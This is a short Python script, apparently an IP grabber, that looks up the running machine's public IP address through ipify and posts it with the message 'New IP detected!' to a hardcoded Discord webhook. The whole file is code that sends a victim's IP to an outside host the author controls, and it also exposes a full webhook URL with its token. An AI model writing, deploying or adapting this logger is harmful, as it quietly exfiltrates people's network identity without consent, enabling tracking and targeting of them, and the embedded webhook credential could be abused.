
from discord_webhook import DiscordWebhook, DiscordEmbed
from requests import get
ip = get("https://api.ipify.org/")
msg = DiscordWebhook(url="https://discordapp.com/api/webhooks/749294535129169990/IZWtkZqrvSLvedbqhAmIhQqIBQnWGY4ruJaCJVDl-8ilyXMstt2w2jJV_4Baze6z7klk",content="**New IP detected!**")
msg2 = DiscordEmbed(title="Info",description="`IP: " + ip.text + "`",color=111111)
msg.add_embed(msg2)
ok = msg.execute()
